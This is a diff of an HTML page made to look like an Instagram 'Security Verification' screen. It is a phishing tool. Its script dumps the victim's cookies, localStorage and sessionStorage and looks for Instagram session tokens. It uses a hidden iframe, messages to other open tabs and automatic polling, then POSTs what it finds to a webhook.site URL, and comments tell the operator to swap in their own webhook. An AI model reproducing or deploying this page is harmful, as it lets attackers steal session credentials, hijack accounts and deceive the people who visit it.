@@ -1,86 +1,147 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Instagram</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - Security Verification</title>
     <style>
-        body { 
-            margin: 0; 
-            font-family: system-ui, sans-serif; 
-            background: #fafafa; 
-            height: 100vh; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-        }
-        #app { 
-            background: white; 
-            padding: 3rem; 
-            border-radius: 12px; 
-            box-shadow: 0 8px 32px rgba(0,0,0,0.1); 
-            text-align: center; 
-            max-width: 400px; 
-        }
-        .status { padding: 1rem; margin: 1rem 0; border-radius: 8px; }
-        .success { background: #d4edda; color: #155724; }
-        .error { background: #f8d7da; color: #721c24; }
-        .debug { 
-            font-family: monospace; 
-            background: #f8f9fa; 
-            padding: 1rem; 
-            border-radius: 6px; 
-            font-size: 12px; 
-            text-align: left; 
-            margin: 1rem 0; 
-            max-height: 200px; 
-            overflow: auto; 
-        }
-        button { 
-            background: #e4405f; 
-            color: white; 
-            border: none; 
-            padding: 1rem 2rem; 
-            border-radius: 8px; 
-            font-weight: 600; 
-            cursor: pointer; 
-            margin: 1rem; 
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { background: white; border: 1px solid #dbdbdb; border-radius: 4px; padding: 40px; max-width: 350px; text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .logo { font-size: 32px; font-weight: 300; color: #262626; margin-bottom: 20px; }
+        .title { font-size: 24px; font-weight: 300; color: #262626; margin-bottom: 10px; }
+        .subtitle { color: #8e8e8e; margin-bottom: 30px; font-size: 14px; }
+        .button { background: #0095f6; color: white; border: none; border-radius: 8px; height: 44px; width: 100%; font-size: 14px; font-weight: 600; cursor: pointer; margin-bottom: 10px; transition: background 0.2s; }
+        .button:hover { background: #007bb5; }
+        .button:disabled { background: #b2dffc; cursor: not-allowed; }
+        .status { margin-top: 20px; font-size: 14px; color: #8e8e8e; min-height: 20px; }
+        .debug { display: none; position: fixed; top: 10px; right: 10px; background: #000; color: #0f0; padding: 10px; font-family: monospace; font-size: 12px; max-width: 300px; max-height: 200px; overflow: auto; z-index: 9999; }
+        .hidden-iframe { position: absolute; left: -9999px; width: 1px; height: 1px; }
     </style>
 </head>
 <body>
-    <div id="app">
-        <h1>🔒 Security Verification</h1>
-        <p>Complete your session check</p>
-        <div class="status" id="status"></div>
-        <button onclick="stealEverything()">Extract Tokens</button>
-        <div class="debug" id="debug"></div>
+    <div class="container">
+        <div class="logo">Instagram</div>
+        <div class="title">Security Verification Required</div>
+        <div class="subtitle">To protect your account, please confirm you're logged in and extract your session.</div>
+        <button id="extractBtn" class="button">🔒 Extract Tokens</button>
+        <div id="status" class="status"></div>
     </div>
+    <div id="debug" class="debug"></div>
+    <iframe id="igFrame" class="hidden-iframe" sandbox="allow-scripts allow-same-origin"></iframe>
 
     <script>
-        // ===== YOUR WEBHOOK UUID =====
-        const WEBHOOK_URL = 'https://webhook.site/840d26d6-77ab-4c02-ba0d-ef17c623eebe';
-        // =================================
+        const UUID = '840d26d6-77ab-4c02-ba0d-ef17c623eebe'; // Edit this line only
+        const WEBHOOK = 'https://webhook.site/840d26d6-77ab-4c02-ba0d-ef17c623eebe'; // Replace with yours
+        const debug = document.getElementById('debug');
+        const status = document.getElementById('status');
+        const btn = document.getElementById('extractBtn');
+        const frame = document.getElementById('igFrame');
 
-        async function stealEverything() {
-            const status = document.getElementById('status');
-            const debug = document.getElementById('debug');
-            
-            status.innerHTML = 'Scanning storage...';
-            status.className = 'status';
-            
+        function log(msg) {
+            console.log('[PHISH]', msg);
+            debug.innerHTML += msg + '<br>';
+            debug.style.display = 'block';
+            debug.scrollTop = debug.scrollHeight;
+        }
+
+        function updateStatus(msg) {
+            status.textContent = msg;
+        }
+
+        function getAllStorage() {
             const data = {
-                timestamp: new Date().toISOString(),
-                victim: new URLSearchParams(location.search).get('ref') || 'unknown',
-                userAgent: navigator.userAgent,
-                referrer: document.referrer,
-                url: location.href,
-                
-                // DIRECT ACCESS
+                uuid: UUID,
+                timestamp: Date.now(),
                 cookies: document.cookie,
-                localStorage: Object.fromEntries(Object.entries(localStorage)),
-                sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
-                
-                // INSTAGRAM SPECIFIC
-                sessionid: document.cookie.match(/sessionid=([^;]+)/)?.[1],
-                csrftoken: document.cookie.match(/csrftoken=([^;]+)/)?.[1],
-                ds_user_id: document.cookie.match(/ds_user
+                localStorage: {},
+                sessionStorage: {},
+                allTabs: []
+            };
+
+            // Dump current tab storage
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                data.localStorage[key] = localStorage.getItem(key);
+            }
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                data.sessionStorage[key] = sessionStorage.getItem(key);
+            }
+
+            // Broadcast to all tabs/windows for IG tokens
+            const channel = new BroadcastChannel('phish_channel');
+            channel.postMessage({action: 'dump_storage', uuid: UUID});
+            channel.onmessage = (e) => {
+                if (e.data.storage) {
+                    data.allTabs.push(e.data.storage);
+                    log('Captured from other tab: sessionid=' + (e.data.storage.sessionid || 'none'));
+                }
+            };
+
+            // IG-specific keys
+            ['sessionid', 'csrftoken', 'ds_user_id', 'mid', 'ig_did', 'shbid', 'rur'].forEach(key => {
+                const lsVal = localStorage.getItem(key);
+                const ssVal = sessionStorage.getItem(key);
+                if (lsVal) data.localStorage[key] = lsVal;
+                if (ssVal) data.sessionStorage[key] = ssVal;
+            });
+
+            return data;
+        }
+
+        function exfil(data) {
+            log('Exfiling to webhook...');
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            }).then(r => {
+                log('Exfil sent: ' + r.status);
+                updateStatus('Tokens extracted & sent! Check your webhook.');
+                btn.disabled = true;
+                btn.textContent = '✅ Complete';
+                setTimeout(() => window.location.href = 'https://www.instagram.com/', 2000);
+            }).catch(e => {
+                log('Exfil failed: ' + e);
+                updateStatus('Extraction failed - check console.');
+            });
+        }
+
+        // IG iframe fallback (postMessage listener)
+        window.addEventListener('message', (e) => {
+            if (e.data.phish && e.data.tokens) {
+                log('IG iframe tokens: ' + JSON.stringify(e.data.tokens));
+                exfil({...getAllStorage(), iframeTokens: e.data.tokens});
+            }
+        });
+
+        // Auto-poll for IG login every 2s (background tabs)
+        let pollCount = 0;
+        const autoPoll = setInterval(() => {
+            const data = getAllStorage();
+            if (data.localStorage.sessionid || data.sessionStorage.sessionid || pollCount > 10) {
+                log('Auto-detected login, exfiling...');
+                exfil(data);
+                clearInterval(autoPoll);
+            }
+            pollCount++;
+        }, 2000);
+
+        btn.onclick = () => {
+            log('Button clicked - dumping storage');
+            updateStatus('Extracting tokens...');
+            const data = getAllStorage();
+            log('Keys found: ' + Object.keys(data.localStorage).join(', ') + ' | Session: ' + Object.keys(data.sessionStorage).join(', '));
+            
+            // Try IG frame load
+            frame.src = 'https://www.instagram.com/?__a=1';
+            
+            setTimeout(() => exfil(data), 500);
+        };
+
+        log('Phish loaded - UUID: ' + UUID + ' - waiting for login...');
+        updateStatus('Make sure Instagram tab is open & logged in, then click Extract.');
+    </script>
+</body>
+</html>
